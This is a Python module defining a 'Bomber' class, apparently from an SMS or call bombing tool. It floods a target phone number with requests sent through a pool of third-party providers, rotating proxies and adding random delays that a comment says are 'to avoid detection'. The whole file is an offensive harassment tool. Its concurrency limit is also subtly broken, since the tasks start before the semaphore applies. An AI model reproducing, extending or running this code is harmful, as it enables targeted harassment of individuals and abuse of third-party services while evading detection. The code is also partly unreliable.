import asyncio
import aiohttp
import random
from typing import List, Dict, Optional
from .provider import Provider
from .proxy import ProxyManager
from .utils import load_working_providers, save_working_cache

class Bomber:
    def __init__(self, target: str, cc: str, num_requests: int,
                 max_concurrent: int = 20, use_proxy: bool = False,
                 retries: int = 2, delay_range: tuple = (0.5, 2.0),
                 provider_pool: Optional[List[Dict]] = None):
        self.target = target
        self.cc = cc
        self.num_requests = num_requests
        self.max_concurrent = max_concurrent
        self.use_proxy = use_proxy
        self.retries = retries
        self.delay_range = delay_range
        self.proxy_manager = ProxyManager() if use_proxy else None
        self.provider_pool = provider_pool or load_working_providers()
        if not self.provider_pool:
            raise ValueError("No providers available. Run verification first.")
        self.results = {"success": 0, "failed": 0}

    async def _send_with_retry(self, provider: Provider, session: aiohttp.ClientSession):
        for attempt in range(self.retries + 1):
            if await provider.send(session):
                self.results["success"] += 1
                return
            # Exponential backoff
            await asyncio.sleep(random.uniform(1, 3) * (2 ** attempt))
        self.results["failed"] += 1

    async def _bomb_single(self, provider_config: dict, session: aiohttp.ClientSession):
        proxy = self.proxy_manager.get_proxy() if self.proxy_manager else None
        provider = Provider(provider_config, self.target, self.cc, proxy=proxy)
        await self._send_with_retry(provider, session)
        # Random delay to avoid detection
        await asyncio.sleep(random.uniform(*self.delay_range))

    async def run(self):
        semaphore = asyncio.Semaphore(self.max_concurrent)
        async with aiohttp.ClientSession() as session:
            tasks = []
            for _ in range(self.num_requests):
                config = random.choice(self.provider_pool)
                task = asyncio.create_task(self._bomb_single(config, session))
                tasks.append(task)
            # Limit concurrency using semaphore
            async def limited_task(task):
                async with semaphore:
                    await task
            await asyncio.gather(*[limited_task(t) for t in tasks])
        return self.results
